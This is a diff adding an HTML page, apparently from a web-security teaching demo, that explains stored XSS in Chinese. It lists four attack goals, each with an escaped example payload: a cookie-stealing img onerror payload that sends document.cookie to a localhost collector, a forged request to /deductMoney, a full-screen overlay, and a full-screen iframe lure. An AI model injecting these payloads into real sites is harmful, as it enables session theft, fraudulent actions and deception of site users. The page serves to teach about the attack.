@@ -1,0 +1,45 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>xss 储存型</title>
+    <link rel="stylesheet" href="./xssFromFrontend.html">
+</head>
+<body>
+<h1>xss 储存型<a href="/">返回目录</a></h1>
+<p>
+    1. 盗取对方的cookie
+</p>
+<p>
+    <code>
+        &lt;img src=null onerror=&quot;document.createElement(&#x27;img&#x27;).src=[&#x27;http://localhost:9001/add?a=&#x27;,encodeURIComponent(document.cookie)].join(&#x27;&#x27;)&quot;/&gt;     </code>
+</p>
+<p>
+    2. 冒用对方身份，进行危险操作
+</p>
+<p>
+    <code>
+        &lt;img src=&quot;/deductMoney&quot;/&gt;
+    </code>
+</p>
+<p>
+    3. 干扰对方网站正常运行：
+</p>
+<p>
+    <code>
+        &lt;div style=&quot;position:fixed;z-index: 100000;top:0;left:0;right:0;bottom:0;background:#000000aa&quot;&gt;&lt;/div&gt;
+    </code>
+</p>
+<p>
+    4. 引入外部链接，诱导其他用户使用
+</p>
+<p>
+    <code>
+        &lt;iframe src=&quot;https://www.baidu.com&quot; style=&quot;position:fixed;top:0;bottom:0;&quot; width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;
+    </code>
+</p>
+</body>
+</html>
